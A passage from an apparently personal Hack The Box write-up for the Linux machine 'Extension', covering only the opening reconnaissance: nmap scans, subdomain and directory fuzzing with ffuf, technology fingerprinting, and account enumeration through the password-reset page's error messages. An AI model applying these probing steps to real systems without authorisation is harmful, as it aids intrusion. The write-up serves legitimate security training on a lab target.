@@ -1,0 +1,1263 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en"><head>
+
+<meta charset="utf-8">
+<meta name="generator" content="quarto-1.7.32">
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+
+<meta name="author" content="0xPThree">
+<meta name="dcterms.date" content="2022-09-11">
+<meta name="description" content="Extensionis a hard-rated Linux machine from Hack The Box. This is a very interesting machine that’s beautifully made, the attack surface is slim and there are a lot of rabbit holes to waste time on. Looking back on each vulnerability they all seem easy, but finding them all took a lot of time and effort - I think I spent around 25 hours in total on this box. Even though it took a lot of time, I really enjoyed it - especially the XSS part as it showcases the real dangers of XSS. I did learn a lot from this machine and I deeply recommend it to anyone!">
+
+<title>Extension - Hack The Box – Exploit.se</title>
+<style>
+code{white-space: pre-wrap;}
+span.smallcaps{font-variant: small-caps;}
+div.columns{display: flex; gap: min(4vw, 1.5em);}
+div.column{flex: auto; overflow-x: auto;}
+div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
+ul.task-list{list-style: none;}
+ul.task-list li input[type="checkbox"] {
+  width: 0.8em;
+  margin: 0 0.8em 0.2em -1em; /* quarto-specific, see https://github.com/quarto-dev/quarto-cli/issues/4556 */ 
+  vertical-align: middle;
+}
+/* CSS for syntax highlighting */
+html { -webkit-text-size-adjust: 100%; }
+pre > code.sourceCode { white-space: pre; position: relative; }
+pre > code.sourceCode > span { display: inline-block; line-height: 1.25; }
+pre > code.sourceCode > span:empty { height: 1.2em; }
+.sourceCode { overflow: visible; }
+code.sourceCode > span { color: inherit; text-decoration: inherit; }
+div.sourceCode { margin: 1em 0; }
+pre.sourceCode { margin: 0; }
+@media screen {
+div.sourceCode { overflow: auto; }
+}
+@media print {
+pre > code.sourceCode { white-space: pre-wrap; }
+pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
+}
+pre.numberSource code
+  { counter-reset: source-line 0; }
+pre.numberSource code > span
+  { position: relative; left: -4em; counter-increment: source-line; }
+pre.numberSource code > span > a:first-child::before
+  { content: counter(source-line);
+    position: relative; left: -1em; text-align: right; vertical-align: baseline;
+    border: none; display: inline-block;
+    -webkit-touch-callout: none; -webkit-user-select: none;
+    -khtml-user-select: none; -moz-user-select: none;
+    -ms-user-select: none; user-select: none;
+    padding: 0 4px; width: 4em;
+  }
+pre.numberSource { margin-left: 3em;  padding-left: 4px; }
+div.sourceCode
+  {   }
+@media screen {
+pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
+}
+</style>
+
+
+<script src="../../site_libs/quarto-nav/quarto-nav.js"></script>
+<script src="../../site_libs/quarto-nav/headroom.min.js"></script>
+<script src="../../site_libs/clipboard/clipboard.min.js"></script>
+<script src="../../site_libs/quarto-search/autocomplete.umd.js"></script>
+<script src="../../site_libs/quarto-search/fuse.min.js"></script>
+<script src="../../site_libs/quarto-search/quarto-search.js"></script>
+<meta name="quarto:offset" content="../../">
+<link href="../../favicon.ico" rel="icon">
+<script src="../../site_libs/quarto-html/quarto.js" type="module"></script>
+<script src="../../site_libs/quarto-html/tabsets/tabsets.js" type="module"></script>
+<script src="../../site_libs/quarto-html/popper.min.js"></script>
+<script src="../../site_libs/quarto-html/tippy.umd.min.js"></script>
+<script src="../../site_libs/quarto-html/anchor.min.js"></script>
+<link href="../../site_libs/quarto-html/tippy.css" rel="stylesheet">
+<link href="../../site_libs/quarto-html/quarto-syntax-highlighting-37eea08aefeeee20ff55810ff984fec1.css" rel="stylesheet" id="quarto-text-highlighting-styles">
+<script src="../../site_libs/bootstrap/bootstrap.min.js"></script>
+<link href="../../site_libs/bootstrap/bootstrap-icons.css" rel="stylesheet">
+<link href="../../site_libs/bootstrap/bootstrap-a98ec624fb63d9b712fc3a6f62e2b305.min.css" rel="stylesheet" append-hash="true" id="quarto-bootstrap" data-mode="light">
+<script id="quarto-search-options" type="application/json">{
+  "location": "navbar",
+  "copy-button": false,
+  "collapse-after": 3,
+  "panel-placement": "end",
+  "type": "overlay",
+  "limit": 50,
+  "keyboard-shortcut": [
+    "f",
+    "/",
+    "s"
+  ],
+  "show-item-context": false,
+  "language": {
+    "search-no-results-text": "No results",
+    "search-matching-documents-text": "matching documents",
+    "search-copy-link-title": "Copy link to search",
+    "search-hide-matches-text": "Hide additional matches",
+    "search-more-match-text": "more match in this document",
+    "search-more-matches-text": "more matches in this document",
+    "search-clear-button-title": "Clear",
+    "search-text-placeholder": "",
+    "search-detached-cancel-button-title": "Cancel",
+    "search-submit-button-title": "Submit",
+    "search-label": "Search"
+  }
+}</script>
+<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-XVW5CQ7DG5"></script>
+
+<script type="text/javascript">
+
+window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'G-XVW5CQ7DG5', { 'anonymize_ip': true});
+</script>
+
+
+<link rel="stylesheet" href="../../scss/styles.css">
+<link rel="stylesheet" href="../../scss/bootstrap-dark.min.css">
+<link rel="stylesheet" href="../../scss/quarto-syntax-highlighting-dark.css">
+<link rel="stylesheet" href="../../scss/bootstrap-icons.css">
+</head>
+
+<body class="nav-fixed quarto-light">
+
+<div id="quarto-search-results"></div>
+  <header id="quarto-header" class="headroom fixed-top quarto-banner">
+    <nav class="navbar navbar-expand-lg " data-bs-theme="dark">
+      <div class="navbar-container container-fluid">
+      <div class="navbar-brand-container mx-auto">
+    <a href="../../index.html" class="navbar-brand navbar-brand-logo">
+    <img src="../../static/exploit_white-orange.png" alt="" class="navbar-logo">
+    </a>
+  </div>
+            <div id="quarto-search" class="" title="Search"></div>
+          <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarCollapse" aria-controls="navbarCollapse" role="menu" aria-expanded="false" aria-label="Toggle navigation" onclick="if (window.quartoToggleHeadroom) { window.quartoToggleHeadroom(); }">
+  <span class="navbar-toggler-icon"></span>
+</button>
+          <div class="collapse navbar-collapse" id="navbarCollapse">
+            <ul class="navbar-nav navbar-nav-scroll ms-auto">
+  <li class="nav-item">
+    <a class="nav-link" href="../../writeups.html"> 
+<span class="menu-text">Writeups</span></a>
+  </li>  
+  <li class="nav-item">
+    <a class="nav-link" href="https://0xpthree.gitbook.io/notes"> 
+<span class="menu-text">Notes</span></a>
+  </li>  
+  <li class="nav-item">
+    <a class="nav-link" href="../../about.html"> 
+<span class="menu-text">About</span></a>
+  </li>  
+</ul>
+          </div> <!-- /navcollapse -->
+            <div class="quarto-navbar-tools">
+</div>
+      </div> <!-- /container-fluid -->
+    </nav>
+</header>
+<!-- content -->
+<header id="title-block-header" class="quarto-title-block default page-columns page-full">
+  <div class="quarto-title-banner page-columns page-full">
+    <div class="quarto-title column-body">
+      <h1 class="title">Extension - Hack The Box</h1>
+                  <div>
+        <div class="description">
+          Extensionis a hard-rated Linux machine from Hack The Box. This is a very interesting machine that’s beautifully made, the attack surface is slim and there are a lot of rabbit holes to waste time on. Looking back on each vulnerability they all seem easy, but finding them all took a lot of time and effort - I think I spent around 25 hours in total on this box. Even though it took a lot of time, I really enjoyed it - especially the XSS part as it showcases the real dangers of XSS. I did learn a lot from this machine and I deeply recommend it to anyone!
+        </div>
+      </div>
+                          <div class="quarto-categories">
+                <div class="quarto-category">hackthebox</div>
+                <div class="quarto-category">linux</div>
+                <div class="quarto-category">web</div>
+                <div class="quarto-category">fuzzing</div>
+                <div class="quarto-category">tampering</div>
+                <div class="quarto-category">xss</div>
+                <div class="quarto-category">fetch</div>
+                <div class="quarto-category">tunneling</div>
+                <div class="quarto-category">shell_exec</div>
+                <div class="quarto-category">docker</div>
+              </div>
+                  </div>
+  </div>
+    
+  
+  <div class="quarto-title-meta">
+
+      <div>
+      <div class="quarto-title-meta-heading">Author</div>
+      <div class="quarto-title-meta-contents">
+               <p>0xPThree </p>
+            </div>
+    </div>
+      
+      <div>
+      <div class="quarto-title-meta-heading">Published</div>
+      <div class="quarto-title-meta-contents">
+        <p class="date">September 11, 2022</p>
+      </div>
+    </div>
+    
+      
+    </div>
+    
+  
+  </header><div id="quarto-content" class="quarto-container page-columns page-rows-contents page-layout-article page-navbar">
+<!-- sidebar -->
+<!-- margin-sidebar -->
+    <div id="quarto-margin-sidebar" class="sidebar margin-sidebar">
+        <nav id="TOC" role="doc-toc" class="toc-active">
+    <h2 id="toc-title">On this page</h2>
+   
+  <ul>
+  <li><a href="#user" id="toc-user" class="nav-link active" data-scroll-target="#user">USER</a>
+  <ul class="collapse">
+  <li><a href="#step-1" id="toc-step-1" class="nav-link" data-scroll-target="#step-1">Step 1</a></li>
+  <li><a href="#step-2" id="toc-step-2" class="nav-link" data-scroll-target="#step-2">Step 2</a></li>
+  <li><a href="#step-3" id="toc-step-3" class="nav-link" data-scroll-target="#step-3">Step 3</a></li>
+  <li><a href="#step-4" id="toc-step-4" class="nav-link" data-scroll-target="#step-4">Step 4</a></li>
+  <li><a href="#step-5" id="toc-step-5" class="nav-link" data-scroll-target="#step-5">Step 5</a></li>
+  </ul></li>
+  <li><a href="#root" id="toc-root" class="nav-link" data-scroll-target="#root">ROOT</a>
+  <ul class="collapse">
+  <li><a href="#step-1-1" id="toc-step-1-1" class="nav-link" data-scroll-target="#step-1-1">Step 1</a></li>
+  <li><a href="#step-2-1" id="toc-step-2-1" class="nav-link" data-scroll-target="#step-2-1">Step 2</a></li>
+  <li><a href="#step-3-1" id="toc-step-3-1" class="nav-link" data-scroll-target="#step-3-1">Step 3</a></li>
+  </ul></li>
+  </ul>
+</nav>
+    </div>
+<!-- main -->
+<main class="content quarto-banner-title-block" id="quarto-document-content">
+
+
+
+
+
+<section id="user" class="level1">
+<h1>USER</h1>
+<section id="step-1" class="level3">
+<h3 class="anchored" data-anchor-id="step-1">Step 1</h3>
+<div class="sourceCode" id="cb1"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  extension nmap <span class="at">-Pn</span> <span class="at">-n</span> <span class="at">-p-</span> 10.10.11.171 </span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="ex">Starting</span> Nmap 7.92 <span class="er">(</span> <span class="ex">https://nmap.org</span> <span class="kw">)</span> <span class="ex">at</span> 2022-09-07 15:49 CEST</span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a><span class="ex">Nmap</span> scan report for 10.10.11.171</span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a><span class="ex">Host</span> is up <span class="er">(</span><span class="ex">0.025s</span> latency<span class="kw">)</span><span class="bu">.</span></span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a><span class="ex">Not</span> shown: 65533 closed tcp ports <span class="er">(</span><span class="ex">conn-refused</span><span class="kw">)</span></span>
+<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a><span class="ex">PORT</span>   STATE SERVICE</span>
+<span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a><span class="ex">22/tcp</span> open  ssh</span>
+<span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a><span class="ex">80/tcp</span> open  http</span>
+<span id="cb1-9"><a href="#cb1-9" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-10"><a href="#cb1-10" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  extension nmap <span class="at">-Pn</span> <span class="at">-n</span> <span class="at">-p22,80</span> <span class="at">-sCV</span> 10.10.11.171 </span>
+<span id="cb1-11"><a href="#cb1-11" aria-hidden="true" tabindex="-1"></a><span class="ex">PORT</span>   STATE SERVICE VERSION</span>
+<span id="cb1-12"><a href="#cb1-12" aria-hidden="true" tabindex="-1"></a><span class="ex">22/tcp</span> open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 <span class="er">(</span><span class="ex">Ubuntu</span> Linux<span class="kw">;</span> <span class="ex">protocol</span> 2.0<span class="kw">)</span></span>
+<span id="cb1-13"><a href="#cb1-13" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">ssh-hostkey:</span> </span>
+<span id="cb1-14"><a href="#cb1-14" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span>   <span class="ex">2048</span> 82:21:e2:a5:82:4d:df:3f:99:db:3e:d9:b3:26:52:86 <span class="er">(</span><span class="ex">RSA</span><span class="kw">)</span></span>
+<span id="cb1-15"><a href="#cb1-15" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span>   <span class="ex">256</span> 91:3a:b2:92:2b:63:7d:91:f1:58:2b:1b:54:f9:70:3c <span class="er">(</span><span class="ex">ECDSA</span><span class="kw">)</span></span>
+<span id="cb1-16"><a href="#cb1-16" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_</span>  256 65:20:39:2b:a7:3b:33:e5:ed:49:a9:ac:ea:01:bd:37 <span class="er">(</span><span class="ex">ED25519</span><span class="kw">)</span></span>
+<span id="cb1-17"><a href="#cb1-17" aria-hidden="true" tabindex="-1"></a><span class="ex">80/tcp</span> open  http    nginx 1.14.0 <span class="er">(</span><span class="ex">Ubuntu</span><span class="kw">)</span></span>
+<span id="cb1-18"><a href="#cb1-18" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_http-title:</span> snippet.htb</span>
+<span id="cb1-19"><a href="#cb1-19" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_http-server-header:</span> nginx/1.14.0 <span class="er">(</span><span class="ex">Ubuntu</span><span class="kw">)</span></span>
+<span id="cb1-20"><a href="#cb1-20" aria-hidden="true" tabindex="-1"></a><span class="ex">Service</span> Info: OS: Linux<span class="kw">;</span> <span class="ex">CPE:</span> cpe:/o:linux:linux_kernel</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<ul>
+<li>Note the title - <strong>snippet.htb</strong>, add it to <code>/etc/hosts</code></li>
+</ul>
+<div class="sourceCode" id="cb2"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  extension ffuf <span class="at">-c</span> <span class="at">-w</span> /usr/share/wordlists/dirb/big.txt <span class="at">-u</span> http://snippet.htb <span class="at">-H</span> <span class="st">"Host: FUZZ.snippet.htb"</span> <span class="at">-fw</span> 1022</span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="ex">dev</span>                     [Status: 200, Size: 12822, Words: 1029, Lines: 250, Duration: 33ms]</span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a><span class="ex">mail</span>                    [Status: 200, Size: 5311, Words: 364, Lines: 97, Duration: 750ms]</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<ul>
+<li>We find 2 vhosts using <code>fuff</code>, add them to <code>/etc/hosts</code></li>
+</ul>
+<div class="sourceCode" id="cb3"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  webanalyze ./webanalyze <span class="at">-host</span> http://snippet.htb</span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="ex">http://snippet.htb</span> <span class="er">(</span><span class="ex">0.4s</span><span class="kw">)</span><span class="bu">:</span></span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Google</span> Font API,  <span class="er">(</span><span class="ex">Font</span> scripts<span class="kw">)</span></span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Ubuntu,</span>  <span class="er">(</span><span class="ex">Operating</span> systems<span class="kw">)</span></span>
+<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Nginx,</span> 1.14.0 <span class="er">(</span><span class="ex">Web</span> servers, Reverse proxies<span class="kw">)</span></span>
+<span id="cb3-6"><a href="#cb3-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-7"><a href="#cb3-7" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  webanalyze ./webanalyze <span class="at">-host</span> http://dev.snippet.htb</span>
+<span id="cb3-8"><a href="#cb3-8" aria-hidden="true" tabindex="-1"></a><span class="ex">http://dev.snippet.htb</span> <span class="er">(</span><span class="ex">0.3s</span><span class="kw">)</span><span class="bu">:</span></span>
+<span id="cb3-9"><a href="#cb3-9" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Nginx,</span> 1.14.0 <span class="er">(</span><span class="ex">Web</span> servers, Reverse proxies<span class="kw">)</span></span>
+<span id="cb3-10"><a href="#cb3-10" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Ubuntu,</span>  <span class="er">(</span><span class="ex">Operating</span> systems<span class="kw">)</span></span>
+<span id="cb3-11"><a href="#cb3-11" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Gitea,</span>  <span class="er">(</span><span class="ex">Development</span><span class="kw">)</span></span>
+<span id="cb3-12"><a href="#cb3-12" aria-hidden="true" tabindex="-1"></a>    </span>
+<span id="cb3-13"><a href="#cb3-13" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  webanalyze ./webanalyze <span class="at">-host</span> http://mail.snippet.htb</span>
+<span id="cb3-14"><a href="#cb3-14" aria-hidden="true" tabindex="-1"></a><span class="ex">http://mail.snippet.htb</span> <span class="er">(</span><span class="ex">0.2s</span><span class="kw">)</span><span class="bu">:</span></span>
+<span id="cb3-15"><a href="#cb3-15" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Bootstrap,</span>  <span class="er">(</span><span class="ex">UI</span> frameworks<span class="kw">)</span></span>
+<span id="cb3-16"><a href="#cb3-16" aria-hidden="true" tabindex="-1"></a>    <span class="ex">RoundCube,</span>  <span class="er">(</span><span class="ex">Webmail</span><span class="kw">)</span></span>
+<span id="cb3-17"><a href="#cb3-17" aria-hidden="true" tabindex="-1"></a>    <span class="ex">PHP,</span>  <span class="er">(</span><span class="ex">Programming</span> languages<span class="kw">)</span></span>
+<span id="cb3-18"><a href="#cb3-18" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Nginx,</span> 1.14.0 <span class="er">(</span><span class="ex">Web</span> servers, Reverse proxies<span class="kw">)</span></span>
+<span id="cb3-19"><a href="#cb3-19" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Ubuntu,</span>  <span class="er">(</span><span class="ex">Operating</span> systems<span class="kw">)</span></span>
+<span id="cb3-20"><a href="#cb3-20" aria-hidden="true" tabindex="-1"></a>    <span class="ex">PHP,</span> 7.4.27 <span class="er">(</span><span class="ex">Programming</span> languages<span class="kw">)</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>We have a lot to cover here, but lets start with the standard <code>snippet.htb</code>.</p>
+<p>Looking on the webpage we find three potential users at the bottom of the frontpage - <em>Charlie Rooper</em>, <em>Jean Castux</em> and <em>Thierry Halliday</em>. It could be a good idea to add these to a file and use <a href="https://gist.github.com/christophetd/ff5237a439c20c629acc82afc9886f24"><code>namemash.py</code></a> to find potential usernames.</p>
+<p>Pressing the big <em>“Get started”</em> button takes us to <code>/login</code> where <code>{}</code> is written above the login form for some reason. I remember when checking a HTB Tournament way back, the creators wrote <code>{}</code> in the http-title to hint that there should be SSTI on that particular page - maybe that’s the case here as well? Or I might just overanalyze and <code>{}</code> is logo for <em>snippet</em>.</p>
+<p>The symbols appear on all browsable sites; <code>/login</code>, <code>/forgot-password</code> and <code>register</code>.</p>
+<p><img src="images/extension01.png" class="img-fluid"></p>
+<p>Looking on <code>/forgot-password</code> it seems like we can enumerate users, a invalid user will provide the error message <em>“no valid recipients”</em> while a valid user will return <em>“We have emailed you password reset link!”</em>.</p>
+<p><img src="images/extension02.png" class="img-fluid"></p>
+<p><img src="images/extension03.png" class="img-fluid"></p>
+<p>We can confirm that both <code>charlie@snippet.htb</code> and <code>jean@snippet.htb</code> are valid users, however <code>thierry@snippet.htb</code> is <strong>not</strong>. Trying a bunch of different authentication bypass techniques with username <code>charlie@snippet.htb</code> locks the account for 60 seconds, so that’s not the way to go.</p>
+<p>Trying to register a new account we’re met with the error <em>“Registration not allowed at this moment!”</em>, could it be that they disabled the feature as it’s vulnerable, or is it just a rabbit hole?</p>
+<p>Playing around with the registration feature in Burp Suite I find nothing of use, lets leave it for now.</p>
+<div class="sourceCode" id="cb4"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  extension ffuf <span class="at">-c</span> <span class="at">-w</span> /usr/share/wordlists/dirb/big.txt <span class="at">-u</span> http://snippet.htb/FUZZ</span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a><span class="ex">.htpasswd</span>               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 51ms]</span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a><span class="ex">.htaccess</span>               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 57ms]</span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a><span class="ex">cgi-bin/</span>                [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 30ms]</span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a><span class="ex">css</span>                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 35ms]</span>
+<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a><span class="ex">dashboard</span>               [Status: 302, Size: 342, Words: 60, Lines: 12, Duration: 1775ms]</span>
+<span id="cb4-7"><a href="#cb4-7" aria-hidden="true" tabindex="-1"></a><span class="ex">favicon.ico</span>             [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 29ms]</span>
+<span id="cb4-8"><a href="#cb4-8" aria-hidden="true" tabindex="-1"></a><span class="ex">forgot-password</span>         [Status: 200, Size: 37782, Words: 1022, Lines: 30, Duration: 1492ms]</span>
+<span id="cb4-9"><a href="#cb4-9" aria-hidden="true" tabindex="-1"></a><span class="ex">images</span>                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 670ms]</span>
+<span id="cb4-10"><a href="#cb4-10" aria-hidden="true" tabindex="-1"></a><span class="ex">js</span>                      [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 29ms]</span>
+<span id="cb4-11"><a href="#cb4-11" aria-hidden="true" tabindex="-1"></a><span class="fu">login</span>                   [Status: 200, Size: 37797, Words: 1022, Lines: 30, Duration: 1672ms]</span>
+<span id="cb4-12"><a href="#cb4-12" aria-hidden="true" tabindex="-1"></a><span class="bu">logout</span>                  [Status: 405, Size: 825, Words: 132, Lines: 23, Duration: 2580ms]</span>
+<span id="cb4-13"><a href="#cb4-13" aria-hidden="true" tabindex="-1"></a><span class="ex">new</span>                     [Status: 302, Size: 342, Words: 60, Lines: 12, Duration: 1189ms]</span>
+<span id="cb4-14"><a href="#cb4-14" aria-hidden="true" tabindex="-1"></a><span class="ex">register</span>                [Status: 200, Size: 37745, Words: 1022, Lines: 30, Duration: 1096ms]</span>
+<span id="cb4-15"><a href="#cb4-15" aria-hidden="true" tabindex="-1"></a><span class="ex">reset-password</span>          [Status: 405, Size: 825, Words: 132, Lines: 23, Duration: 1891ms]</span>
+<span id="cb4-16"><a href="#cb4-16" aria-hidden="true" tabindex="-1"></a><span class="ex">server-status</span>           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 30ms]</span>
+<span id="cb4-17"><a href="#cb4-17" aria-hidden="true" tabindex="-1"></a><span class="ex">snippets</span>                [Status: 302, Size: 342, Words: 60, Lines: 12, Duration: 1311ms]</span>
+<span id="cb4-18"><a href="#cb4-18" aria-hidden="true" tabindex="-1"></a><span class="fu">users</span>                   [Status: 302, Size: 342, Words: 60, Lines: 12, Duration: 1633ms]</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Trying to fuzz anything after <code>/snippets</code> all return 302’s, while testing both <code>/users</code> and <code>/dashboard</code> we get 404’s. However I find nothing more. Looking at the source code of <code>index.php</code> we find this huge script block which starts with all (?) functions on the site, including some we haven’t found yet.</p>
+<div class="sourceCode" id="cb5"><pre class="sourceCode javascript code-with-copy"><code class="sourceCode javascript"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> Ziggy <span class="op">=</span> {</span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a>    <span class="st">"url"</span><span class="op">:</span> <span class="st">"http:</span><span class="sc">\/\/</span><span class="st">snippet.htb"</span><span class="op">,</span></span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a>    <span class="st">"port"</span><span class="op">:</span> <span class="kw">null</span><span class="op">,</span></span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a>    <span class="st">"defaults"</span><span class="op">:</span> {}<span class="op">,</span></span>
+<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a>    <span class="st">"routes"</span><span class="op">:</span> {</span>
+<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a>    [<span class="op">...</span> snip <span class="op">...</span>]</span>
+<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a>        <span class="st">"users"</span><span class="op">:</span> {</span>
+<span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a>            <span class="st">"uri"</span><span class="op">:</span> <span class="st">"users"</span><span class="op">,</span></span>
+<span id="cb5-9"><a href="#cb5-9" aria-hidden="true" tabindex="-1"></a>            <span class="st">"methods"</span><span class="op">:</span> [<span class="st">"GET"</span><span class="op">,</span> <span class="st">"HEAD"</span>]</span>
+<span id="cb5-10"><a href="#cb5-10" aria-hidden="true" tabindex="-1"></a>        }<span class="op">,</span></span>
+<span id="cb5-11"><a href="#cb5-11" aria-hidden="true" tabindex="-1"></a>    [<span class="op">...</span> snip <span class="op">...</span>]</span>
+<span id="cb5-12"><a href="#cb5-12" aria-hidden="true" tabindex="-1"></a>        <span class="st">"snippets.update"</span><span class="op">:</span> {</span>
+<span id="cb5-13"><a href="#cb5-13" aria-hidden="true" tabindex="-1"></a>            <span class="st">"uri"</span><span class="op">:</span> <span class="st">"snippets</span><span class="sc">\/</span><span class="st">update</span><span class="sc">\/</span><span class="st">{id}"</span><span class="op">,</span></span>
+<span id="cb5-14"><a href="#cb5-14" aria-hidden="true" tabindex="-1"></a>            <span class="st">"methods"</span><span class="op">:</span> [<span class="st">"GET"</span><span class="op">,</span> <span class="st">"HEAD"</span>]</span>
+<span id="cb5-15"><a href="#cb5-15" aria-hidden="true" tabindex="-1"></a>        }<span class="op">,</span></span>
+<span id="cb5-16"><a href="#cb5-16" aria-hidden="true" tabindex="-1"></a>        <span class="st">"api.snippets.update"</span><span class="op">:</span> {</span>
+<span id="cb5-17"><a href="#cb5-17" aria-hidden="true" tabindex="-1"></a>            <span class="st">"uri"</span><span class="op">:</span> <span class="st">"snippets</span><span class="sc">\/</span><span class="st">update</span><span class="sc">\/</span><span class="st">{id}"</span><span class="op">,</span></span>
+<span id="cb5-18"><a href="#cb5-18" aria-hidden="true" tabindex="-1"></a>            <span class="st">"methods"</span><span class="op">:</span> [<span class="st">"POST"</span>]</span>
+<span id="cb5-19"><a href="#cb5-19" aria-hidden="true" tabindex="-1"></a>        }<span class="op">,</span></span>
+<span id="cb5-20"><a href="#cb5-20" aria-hidden="true" tabindex="-1"></a>        <span class="st">"api.snippets.delete"</span><span class="op">:</span> {</span>
+<span id="cb5-21"><a href="#cb5-21" aria-hidden="true" tabindex="-1"></a>            <span class="st">"uri"</span><span class="op">:</span> <span class="st">"snippets</span><span class="sc">\/</span><span class="st">delete</span><span class="sc">\/</span><span class="st">{id}"</span><span class="op">,</span></span>
+<span id="cb5-22"><a href="#cb5-22" aria-hidden="true" tabindex="-1"></a>            <span class="st">"methods"</span><span class="op">:</span> [<span class="st">"DELETE"</span>]</span>
+<span id="cb5-23"><a href="#cb5-23" aria-hidden="true" tabindex="-1"></a>        }<span class="op">,</span></span>
+<span id="cb5-24"><a href="#cb5-24" aria-hidden="true" tabindex="-1"></a>        <span class="st">"snippets.new"</span><span class="op">:</span> {</span>
+<span id="cb5-25"><a href="#cb5-25" aria-hidden="true" tabindex="-1"></a>            <span class="st">"uri"</span><span class="op">:</span> <span class="st">"new"</span><span class="op">,</span></span>
+<span id="cb5-26"><a href="#cb5-26" aria-hidden="true" tabindex="-1"></a>            <span class="st">"methods"</span><span class="op">:</span> [<span class="st">"GET"</span><span class="op">,</span> <span class="st">"HEAD"</span>]</span>
+<span id="cb5-27"><a href="#cb5-27" aria-hidden="true" tabindex="-1"></a>        }<span class="op">,</span></span>
+<span id="cb5-28"><a href="#cb5-28" aria-hidden="true" tabindex="-1"></a>        <span class="st">"users.validate"</span><span class="op">:</span> {</span>
+<span id="cb5-29"><a href="#cb5-29" aria-hidden="true" tabindex="-1"></a>            <span class="st">"uri"</span><span class="op">:</span> <span class="st">"management</span><span class="sc">\/</span><span class="st">validate"</span><span class="op">,</span></span>
